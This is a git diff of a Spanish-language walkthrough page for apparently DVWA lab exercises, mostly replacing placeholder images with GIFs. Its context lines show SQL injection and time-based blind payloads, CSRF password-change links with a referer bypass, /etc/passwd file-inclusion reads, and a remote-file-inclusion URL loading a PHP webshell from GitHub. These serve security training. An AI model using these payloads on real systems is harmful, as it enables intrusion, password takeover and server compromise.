@@ -582,7 +582,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
                         <pre>
 ' or '1'='1' UNION SELECT database(),table_name from information_schema.tables; -- -</pre>
                         <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
+                            <img src="../img/sqlclasicalow.gif" alt="En progreso..." />
                         </div>
                         <br /><br />
                         <h4>Dificultad media</h4>
@@ -669,7 +669,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
                         </p>
                         <pre>1 UNION SELECT database(),table_name from information_schema.tables; -- -</pre>
                         <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
+                            <img src="../img/sqlclasicamedium.gif" alt="En progreso..." />
                         </div>
                         <br /><br />
                         <h4>Dificultad alta</h4>
@@ -741,7 +741,7 @@ if( isset( $_SESSION [ 'id' ] ) ) {
                         <pre>
 ' or '1'='1' UNION SELECT database(),table_name from information_schema.tables; -- -</pre>
                         <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
+                            <img src="../img/sqlclasicahigh.gif" alt="En progreso..." />
                         </div>
                     </div>
                 </div>
@@ -827,7 +827,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
                         </p>
                         <pre>1' and sleep(5)#</pre>
                         <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
+                            <img src="../img/sqlblindlow.gif" alt="En progreso..." />
                         </div>
                         <br /><br />
                         <h4>Dificultad media</h4>
@@ -894,7 +894,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
                         </p>
                         <pre>1 and sleep(5)#</pre>
                         <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
+                            <img src="../img/sqlblindmedium.gif" alt="En progreso..." />
                         </div>
                         <br /><br />
                         <h4>Dificultad alta</h4>
@@ -968,7 +968,7 @@ if( isset( $_COOKIE[ 'id' ] ) ) {
                             el primer nivel <b>1' and sleep(5)#</b>, tambien valdira en este nivel.</p>
                         <pre>1' and sleep(5)#</pre>
                         <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
+                            <img src="../img/sqlblindhigh.gif" alt="En progreso..." />
                         </div>
                     </div>
                 </div>
@@ -1027,12 +1027,125 @@ if( isset( $_GET[ 'Change' ] ) ) {
                             si las contraseñas son iguales, por lo que cambiaremos nuestra contraseña y copiaremos el
                             enlace que se genera, siendo asi este enlace el que cambiara la contraseña al usuario</p>
                         <pre>http://localhost:4280/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change#</pre>
-                        <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
-                        </div>
                         <br /><br />
                         <h4>Dificultad media.</h4>
                         <p>Codigo fuente en php:</p>
+                        <pre>
+&lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+    // Checks to see where the request came from
+    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
+        // Get input
+        $pass_new  = $_GET[ 'password_new' ];
+        $pass_conf = $_GET[ 'password_conf' ];
+
+        // Do the passwords match?
+        if( $pass_new == $pass_conf ) {
+            // They do!
+            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+            $pass_new = md5( $pass_new );
+
+            // Update the database
+            $current_user = dvwaCurrentUser();
+            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
+            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+            // Feedback for the user
+            echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";
+        }
+        else {
+            // Issue with passwords matching
+            echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";
+        }
+    }
+    else {
+        // Didn't come from a trusted source
+        echo "&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?&gt;</pre>
+                        <p>Como podemos ver en el codigo, en este caso se le añade una sanitización especial, la cual es que la cabecera <b>referer</b>, lo cual si mandamos una url a cualquier persona y no estaba antes en la pagina, no funcionara, ya que detectara que el referer no es correcto. para solucionar dicho problema, tendremos que utilizar la burpsuite y añadir la cabecera referrer a dicha petición, siendo una cabecera de ejemeplo <b>Referer: http://192.168.179.1:4280/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change</b>, por lo que nosotros podremos añadir la siguiente cabecera para que funcione.</p>
+                        <pre>referer: http:192.168.179.1:4280/vulnerabilities/csrf</pre>
+                        <div class="image-card">
+                            <img src="../img/csrfmedium.gif" alt="En progreso..." />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad alta.</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
+&lt;?php
+
+$change = false;
+$request_type = "html";
+$return_message = "Request Failed";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST" && array_key_exists ("CONTENT_TYPE", $_SERVER) && $_SERVER['CONTENT_TYPE'] == "application/json") {
+    $data = json_decode(file_get_contents('php://input'), true);
+    $request_type = "json";
+    if (array_key_exists("HTTP_USER_TOKEN", $_SERVER) &&
+        array_key_exists("password_new", $data) &&
+        array_key_exists("password_conf", $data) &&
+        array_key_exists("Change", $data)) {
+        $token = $_SERVER['HTTP_USER_TOKEN'];
+        $pass_new = $data["password_new"];
+        $pass_conf = $data["password_conf"];
+        $change = true;
+    }
+} else {
+    if (array_key_exists("user_token", $_REQUEST) &&
+        array_key_exists("password_new", $_REQUEST) &&
+        array_key_exists("password_conf", $_REQUEST) &&
+        array_key_exists("Change", $_REQUEST)) {
+        $token = $_REQUEST["user_token"];
+        $pass_new = $_REQUEST["password_new"];
+        $pass_conf = $_REQUEST["password_conf"];
+        $change = true;
+    }
+}
+
+if ($change) {
+    // Check Anti-CSRF token
+    checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = mysqli_real_escape_string ($GLOBALS["___mysqli_ston"], $pass_new);
+        $pass_new = md5( $pass_new );
+
+        // Update the database
+        $current_user = dvwaCurrentUser();
+        $insert = "UPDATE `users` SET password = '" . $pass_new . "' WHERE user = '" . $current_user . "';";
+        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert );
+
+        // Feedback for the user
+        $return_message = "Password Changed.";
+    }
+    else {
+        // Issue with passwords matching
+        $return_message = "Passwords did not match.";
+    }
+
+    mysqli_close($GLOBALS["___mysqli_ston"]);
+
+    if ($request_type == "json") {
+        generateSessionToken();
+        header ("Content-Type: application/json");
+        print json_encode (array("Message" =>$return_message));
+        exit;
+    } else {
+        echo "&lt;pre&gt;" . $return_message . "&lt;/pre&gt;";
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</pre>
                     </div>
                 </div>
 
@@ -1094,7 +1207,7 @@ $file = $_GET[ 'page' ];
                             que si añadimos <b>/etc/passwd</b> a la url deberia de mostrar su contenido</p>
                         <pre>/etc/passwd</pre>
                         <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
+                            <img src="../img/lfimedium.gif" alt="En progreso..." />
                         </div>
                         <br /><br />
                         <h4>Dificultad media.</h4>
@@ -1115,6 +1228,9 @@ $file = str_replace( array( "../", "..\\" ), "", $file );
                             podamos ir marcha atras para buscar archivos, pero si que podremos utilizar rutas absolutas
                             como hemos hecho anteriormente con <b>/etc/passwd</b></p>
                         <pre>/etc/passwd</pre>
+                        <div class="image-card">
+                            <img src="../img/lfimedium.gif" alt="En progreso..." />
+                        </div>
                         <br /><br />
                         <h4>Dificultad alta.</h4>
                         <p>Codigo fuente en php:</p>
@@ -1140,7 +1256,7 @@ if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
                             que tenemos que introducir <b>file:///etc/passwd</b> y funcionara.</p>
                         <pre>file:///etc/passwd</pre>
                         <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
+                            <img src="../img/lfihigh.gif" alt="En progreso..." />
                         </div>
                     </div>
                 </div>
@@ -1168,7 +1284,7 @@ $file = $_GET[ 'page' ];
                             funcionara, siendo esta:</p>
                         <pre>https://raw.githubusercontent.com/JohnTroony/php-webshells/refs/heads/master/Collection/Rootshell.v.1.0.php</pre>
                         <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
+                            <img src="../img/rfilow.gif" alt="En progreso..." />
                         </div>
                         <br /><br />
                         <h4>Dificultad media.</h4>
@@ -1195,11 +1311,9 @@ $file = str_replace( array( "../", "..\\" ), "", $file );
                             <b>HttPs://</b>, funcionara correctamente siendo la url final esta
                             HttPs://raw.githubusercontent.com/JohnTroony/php-webshells/refs/heads/master/Collection/Rootshell.v.1.0.php
                         </p>
-                        <pre>
-                            HttPs://raw.githubusercontent.com/JohnTroony/php-webshells/refs/heads/master/Collection/Rootshell.v.1.0.php
-                        </pre>
+                        <pre>HttPs://raw.githubusercontent.com/JohnTroony/php-webshells/refs/heads/master/Collection/Rootshell.v.1.0.php</pre>
                         <div class="image-card">
-                            <img src="../img/wip.png" alt="En progreso..." />
+                            <img src="../img/rfimedium.gif" alt="En progreso..." />
                         </div>
                         <br /><br />
                         <p>En este caso la dificultad alta no es posible de hacerla mediante RFI, ya que está esta
